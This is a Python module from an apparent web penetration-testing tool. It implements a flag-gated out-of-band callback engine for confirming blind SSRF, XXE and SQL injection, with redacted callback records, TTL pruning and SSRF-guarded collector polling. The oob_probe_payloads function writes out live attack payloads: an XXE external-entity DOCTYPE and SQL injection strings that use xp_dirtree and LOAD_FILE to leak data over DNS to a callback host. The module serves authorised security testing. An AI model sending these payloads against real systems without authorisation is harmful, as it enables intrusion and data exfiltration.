# src/webpent/shared/oob.py
"""Out-of-band (OOB) interaction engine (2026-10-25 Proposal 3).

Blind vulnerability classes (blind SSRF, XXE with external entity
resolution, blind SQLi with DNS/HTTP exfiltration) never echo evidence
into the HTTP response the probe observes: the only proof is a CALLBACK
that arrives on infrastructure the operator controls. This module is
that infrastructure's client side: it mints per-probe, per-engagement
OOB identifiers, records callbacks, and matches callbacks back to the
probe that triggered them with a deterministic token matcher.

Architectural decision (proposal plan step 1): a SELF-CONTAINED adapter
with a pluggable callback store rather than a hard dependency on the
interactsh-client library. The engine works identically against:

  * an in-memory store (unit tests, the Proposal 6 self-test harness
    with an accelerated-pulse callback simulator), or
  * the persistent SQLite store in ``memory/db.py``
    (``DatabaseOOBStore`` — the token<->probe mapping and the callback
    log live in dedicated tables there), or
  * an operator-hosted micro DNS/HTTP collector via
    :func:`poll_remote_collector` (the operator runs the listener on
    their own zone; webpent only polls its HTTP API).

An interactsh-client adapter can be added later as one more store/
poller implementation; nothing in this module's contracts assumes one.

Design rules (campaign discipline, same as Proposals 1+2):

  * FLAG-GATED — every consumer checks ``enable_oob_collaboration``
    (default False) before touching this module; with the flag off it
    is inert library code.
  * FAIL-CLOSED on identity — a callback whose token does not match a
    REGISTERED probe is dropped (never stored), so a third party cannot
    poison the evidence store by spraying guesses at the collector.
    A probe registered without an operator domain is never minted
    (``register_probe`` returns None and callers skip).
  * NO CLIENT-IDENTITY LEAK — callback records store the protocol and
    a truncated SHA-256 of the source address, never the address
    itself, hostname, or headers, so the callback log cannot become a
    target-inventory leak if it is copied or reported.
  * DETERMINISTIC MATCHING — a callback confirms a probe only when the
    token matches AND the callback's timestamp falls inside the probe's
    evidence window ``[registered_at, registered_at + window]``. Clock
    is injected, so tests run an accelerated pulse without sleeping.
  * BOUNDED — callbacks carry a 24-hour TTL (prune); each finding gets
    a bounded number of probe payloads.
"""

from __future__ import annotations

import hashlib
import secrets
import threading
from collections.abc import Callable, Iterable
from dataclasses import dataclass, field
from typing import Any, Protocol
from urllib.parse import quote

DEFAULT_CALLBACK_TTL_SECONDS = 24 * 60 * 60
DEFAULT_EVIDENCE_WINDOW_SECONDS = 300.0
_MAX_CALLBACK_DETAILS_CHARS = 256
_MAX_OOB_PAYLOADS_PER_FINDING = 3

# The blind families this engine serves (VulnClass values). Each gets
# exactly ONE bounded probe shape per finding (see oob_probe_payloads).
OOB_PROBE_VULN_CLASSES = frozenset({"ssrf", "xxe", "sqli"})


def _slug(value: str) -> str:
    """DNS-label-safe slug of an engagement/thread id."""
    out = []
    for ch in str(value or "").lower():
        if ch.isalnum():
            out.append(ch)
        elif ch in {"-", "_"}:
            out.append("-")
    slug = "".join(out).strip("-")
    return slug[:40] or "engagement"


def _source_fingerprint(source_ip: str | None) -> str:
    """Redaction-safe source identity: truncated SHA-256, never the IP."""
    if not source_ip:
        return ""
    return hashlib.sha256(str(source_ip).encode("utf-8")).hexdigest()[:12]


@dataclass(frozen=True)
class OOBBinding:
    """One registered OOB probe: token <-> host <-> finding linkage."""

    token: str  # 128-bit hex; the ONLY correlation key
    host: str  # full OOB hostname payloads embed
    engagement_id: str
    vuln_class: str
    probe_label: str
    registered_at: float


@dataclass(frozen=True)
class OOBCallback:
    """One observed out-of-band interaction (redaction-safe)."""

    token: str
    protocol: str
    seen_at: float
    source_fingerprint: str = ""
    details: str = field(default="")


class OOBStore(Protocol):
    """Minimal storage contract for bindings and callbacks."""

    def save_binding(self, binding: OOBBinding) -> None: ...

    def get_binding(self, token: str) -> OOBBinding | None: ...

    def append_callback(self, callback: OOBCallback) -> None: ...

    def callbacks_for_token(self, token: str) -> list[OOBCallback]: ...

    def prune(self, *, max_age_seconds: float, now: float) -> int: ...


class MemoryOOBStore:
    """Thread-safe in-memory store (tests + self-test harness)."""

    def __init__(self) -> None:
        self._lock = threading.Lock()
        self._bindings: dict[str, OOBBinding] = {}
        self._callbacks: dict[str, list[OOBCallback]] = {}

    def save_binding(self, binding: OOBBinding) -> None:
        with self._lock:
            self._bindings[binding.token] = binding

    def get_binding(self, token: str) -> OOBBinding | None:
        with self._lock:
            return self._bindings.get(str(token))

    def append_callback(self, callback: OOBCallback) -> None:
        with self._lock:
            self._callbacks.setdefault(callback.token, []).append(callback)

    def callbacks_for_token(self, token: str) -> list[OOBCallback]:
        with self._lock:
            return list(self._callbacks.get(str(token), ()))

    def prune(self, *, max_age_seconds: float, now: float) -> int:
        cutoff = float(now) - float(max_age_seconds)
        removed = 0
        with self._lock:
            for token in list(self._callbacks):
                kept = [cb for cb in self._callbacks[token] if cb.seen_at >= cutoff]
                removed += len(self._callbacks[token]) - len(kept)
                if kept:
                    self._callbacks[token] = kept
                else:
                    self._callbacks.pop(token, None)
        return removed


class DatabaseOOBStore:
    """Persistent store backed by the ``memory/db.py`` OOB tables."""

    def __init__(self, db_manager: Any) -> None:
        self._db = db_manager

    def save_binding(self, binding: OOBBinding) -> None:
        self._db.register_oob_binding(
            token=binding.token,
            host=binding.host,
            engagement_id=binding.engagement_id,
            vuln_class=binding.vuln_class,
            probe_label=binding.probe_label,
            registered_at=binding.registered_at,
        )

    def get_binding(self, token: str) -> OOBBinding | None:
        row = self._db.get_oob_binding(str(token))
        if not row:
            return None
        return OOBBinding(
            token=str(row["token"]),
            host=str(row["host"]),
            engagement_id=str(row["engagement_id"]),
            vuln_class=str(row["vuln_class"]),
            probe_label=str(row.get("probe_label", "") or ""),
            registered_at=float(row["registered_at"]),
        )

    def append_callback(self, callback: OOBCallback) -> None:
        self._db.record_oob_callback(
            token=callback.token,
            protocol=callback.protocol,
            seen_at=callback.seen_at,
            source_fingerprint=callback.source_fingerprint,
            details=callback.details,
        )

    def callbacks_for_token(self, token: str) -> list[OOBCallback]:
        rows = self._db.get_oob_callbacks_for_token(str(token))
        return [
            OOBCallback(
                token=str(row["token"]),
                protocol=str(row.get("protocol", "") or ""),
                seen_at=float(row["seen_at"]),
                source_fingerprint=str(row.get("source_fingerprint", "") or ""),
                details=str(row.get("details", "") or ""),
            )
            for row in rows
        ]

    def prune(self, *, max_age_seconds: float, now: float) -> int:
        return int(
            self._db.prune_oob_callbacks(
                max_age_seconds=float(max_age_seconds), now=float(now)
            )
        )


class OOBCollaborator:
    """Mints per-probe OOB identities and matches callbacks to probes."""

    def __init__(
        self,
        *,
        base_domain: str,
        store: OOBStore | None = None,
        now: Callable[[], float] | None = None,
        evidence_window_seconds: float = DEFAULT_EVIDENCE_WINDOW_SECONDS,
    ) -> None:
        self._base_domain = str(base_domain or "").strip().lstrip(".")
        self._store: OOBStore = store or MemoryOOBStore()
        self._now = now or _default_now
        self._evidence_window = float(evidence_window_seconds)

    @property
    def enabled(self) -> bool:
        """Fail-closed: no operator domain, no OOB (callers skip)."""
        return bool(self._base_domain)

    def register_probe(
        self,
        *,
        engagement_id: str,
        vuln_class: str,
        probe_label: str = "",
    ) -> OOBBinding | None:
        """Mint one fresh probe identity.

        Returns None (fail-closed) when no operator domain is
        configured — callers treat None as "OOB unavailable this pass",
        never as a probe failure.
        """
        if not self.enabled:
            return None
        token = secrets.token_hex(16)  # 128 bits of entropy
        binding = OOBBinding(
            token=token,
            host=f"{token}.{_slug(engagement_id)}.{self._base_domain}",
            engagement_id=_slug(engagement_id),
            vuln_class=str(vuln_class),
            probe_label=str(probe_label or ""),
            registered_at=float(self._now()),
        )
        self._store.save_binding(binding)
        return binding

    def record_callback(
        self,
        token: str,
        *,
        protocol: str = "http",
        source_ip: str | None = None,
        seen_at: float | None = None,
        details: str | None = None,
    ) -> bool:
        """Record one interaction; False when the token is unregistered.

        Fail-closed identity check FIRST: callbacks for tokens this
        engine never minted are dropped so the evidence store cannot be
        poisoned from outside. Source identity is fingerprinted, never
        stored raw.
        """
        binding = self._store.get_binding(str(token))
        if binding is None:
            return False
        self._store.append_callback(
            OOBCallback(
                token=str(token),
                protocol=str(protocol or "http"),
                seen_at=float(self._now() if seen_at is None else seen_at),
                source_fingerprint=_source_fingerprint(source_ip),
                details=str(details or "")[:_MAX_CALLBACK_DETAILS_CHARS],
            )
        )
        return True

    def poll_callbacks(
        self,
        binding: OOBBinding,
        *,
        window_seconds: float | None = None,
    ) -> list[OOBCallback]:
        """Deterministic matcher: callbacks inside the evidence window.

        A callback confirms only when token matches (store lookup already
        guarantees this) AND ``registered_at <= seen_at <= registered_at
        + window``. Callbacks timestamped BEFORE the probe was registered
        are excluded — they cannot have been caused by this probe.
        """
        window = (
            self._evidence_window
            if window_seconds is None
            else float(window_seconds)
        )
        in_window: list[OOBCallback] = []
        for callback in self._store.callbacks_for_token(binding.token):
            if callback.seen_at < binding.registered_at:
                continue
            if callback.seen_at > binding.registered_at + window:
                continue
            in_window.append(callback)
        return in_window

    def prune_callbacks(
        self, *, max_age_seconds: float = DEFAULT_CALLBACK_TTL_SECONDS
    ) -> int:
        """Enforce the 24-hour callback TTL (bounded storage)."""
        return self._store.prune(
            max_age_seconds=max_age_seconds, now=self._now()
        )


def _default_now() -> float:
    import time

    return time.time()


def oob_probe_payloads(binding: OOBBinding) -> list[str]:
    """One bounded probe payload per blind family (never a spray).

    * ssrf     -> HTTP(S) fetch of the OOB host.
    * xxe      -> external-entity DOCTYPE resolving the OOB host.
    * sqli     -> bounded DNS-exfil markers for the two stacks with a
      native file/DNS primitive (MSSQL xp_dirtree, MySQL LOAD_FILE);
      other stacks are left to the tool-driven sqlmap flow.
    """
    host = binding.host
    if binding.vuln_class == "ssrf":
        return [f"http://{host}/probe", f"https://{host}/probe"]
    if binding.vuln_class == "xxe":
        return [
            '<?xml version="1.0"?>'
            f'<!DOCTYPE r [<!ENTITY x SYSTEM "http://{host}/">]><r>&x;</r>'
        ]
    if binding.vuln_class == "sqli":
        escaped_host = quote(host, safe=".")
        return [
            f"' OR 1=1; EXEC master..xp_dirtree '\\\\{escaped_host}\\x'-- -",
            f"' OR LOAD_FILE(CONCAT('\\\\\\\\oob.',"
            f"(SELECT 1),'.{escaped_host}\\\\x'))-- -",
        ]
    return []


def attach_oob_probes(
    findings: Iterable[Any],
    *,
    base_domain: str,
    engagement_id: str,
    collaborator: OOBCollaborator | None = None,
    now: Callable[[], float] | None = None,
) -> tuple[list[Any], dict[str, list[str]]]:
    """Flag-gated payload_generator injection point (Proposal 3).

    For each finding in a blind OOB family that does not already carry
    OOB evidence, registers ONE probe, stamps the finding's evidence
    (``oob_token``/``oob_host``/``oob_registered_at`` — the keys the
    canonical OOB validator reads) and returns the bounded probe
    payloads keyed by finding id. Findings outside the blind families,
    already-stamped findings, and disabled engines (empty domain) pass
    through untouched, so the default-off path is byte-identical.
    """
    updated: list[Any] = []
    payloads_by_finding: dict[str, list[str]] = {}
    if not str(base_domain or "").strip():
        return list(findings), payloads_by_finding
    engine = collaborator or OOBCollaborator(
        base_domain=base_domain, now=now
    )
    if not engine.enabled:
        return list(findings), payloads_by_finding
    for finding in findings:
        evidence = dict(getattr(finding, "evidence", None) or {})
        vuln_class = str(getattr(finding, "vuln_class", "") or "")
        if evidence.get("oob_token") or vuln_class not in OOB_PROBE_VULN_CLASSES:
            updated.append(finding)
            continue
        binding = engine.register_probe(
            engagement_id=engagement_id,
            vuln_class=vuln_class,
            probe_label=str(getattr(finding, "id", "") or ""),
        )
        if binding is None:  # defensive; engine.enabled was checked
            updated.append(finding)
            continue
        evidence["oob_token"] = binding.token
        evidence["oob_host"] = binding.host
        evidence["oob_registered_at"] = binding.registered_at
        evidence["oob_engagement_id"] = binding.engagement_id
        updated.append(finding.model_copy(update={"evidence": evidence}))
        probes = oob_probe_payloads(binding)[:_MAX_OOB_PAYLOADS_PER_FINDING]
        if probes:
            payloads_by_finding[str(finding.id)] = probes
    return updated, payloads_by_finding


def poll_remote_collector(
    collector_url: str,
    *,
    token: str,
    timeout: float = 5.0,
) -> list[dict[str, Any]]:
    """Adapter for an operator-hosted micro collector (plan step 2).

    Performs one bounded GET ``{collector_url}?token=...`` expecting a
    JSON array of ``{protocol, seen_at, source_ip?, details?}`` records
    the listener observed on its DNS/HTTP zone. The caller feeds each
    record into ``OOBCollaborator.record_callback``. ANY failure
    (network, timeout, bad JSON) returns [] — a poll failure is an
    INCONCLUSIVE signal upstream, never a halt and never an exception
    escaped into a validator.
    """
    import json as _json
    from urllib.parse import urlencode, urlsplit

    try:
        url = f"{str(collector_url).rstrip('/')}?{urlencode({'token': token})}"
        # M1-A (M-5): the poll goes through the ONE authoritative safe
        # transport (SSRF pinning + private-IP blocklist + rate ceiling).
        # A raw urlopen on an operator-ENV-shaped URL could fetch
        # internal endpoints; the safe client blocks that.  Fail-open
        # semantics preserved: poll failure == "no data this round".
        #
        # M1-C (UM-DR-12): a LOCAL OAST collector is first-party
        # infrastructure, but loopback is on the SSRF blocklist, so the
        # safe transport vetoed the poll (the M-5 regression the OAST
        # round-trip tests caught). When — and ONLY when — the configured
        # collector host is loopback, the poll sets the transport's
        # loopback-trusted exemption around its single GET. The exemption
        # is loopback-only inside the transport; a private non-loopback
        # collector (192.168.x, 10.x, 169.254.x) stays blocked exactly as
        # M-5 pinned it.
        from webpent.shared.http import (
            clear_loopback_trusted_endpoint,
            make_safe_httpx_client,
            set_loopback_trusted_endpoint,
        )

        collector_host = urlsplit(str(collector_url)).hostname or ""
        loopback_token = None
        try:
            import ipaddress as _ipaddress

            host_ip = _ipaddress.ip_address(collector_host.strip("[]"))
            collector_is_loopback = host_ip.is_loopback
        except ValueError:
            collector_is_loopback = collector_host.strip("[]").lower() in {
                "localhost"
            }
        if collector_is_loopback:
            loopback_token = set_loopback_trusted_endpoint()
        try:
            with make_safe_httpx_client(
                timeout=float(timeout), follow_redirects=False
            ) as client:
                resp = client.get(url)
                resp.raise_for_status()
                payload = _json.loads(resp.text)
        finally:
            if loopback_token is not None:
                clear_loopback_trusted_endpoint(loopback_token)
        if not isinstance(payload, list):
            return []
        return [dict(item) for item in payload if isinstance(item, dict)]
    except Exception:
        return []  # fail-open read: poll failure == "no data this round"


__all__ = [
    "DEFAULT_CALLBACK_TTL_SECONDS",
    "DEFAULT_EVIDENCE_WINDOW_SECONDS",
    "DatabaseOOBStore",
    "MemoryOOBStore",
    "OOB_PROBE_VULN_CLASSES",
    "OOBBinding",
    "OOBCallback",
    "OOBCollaborator",
    "OOBStore",
    "attach_oob_probes",
    "oob_probe_payloads",
    "poll_remote_collector",
]
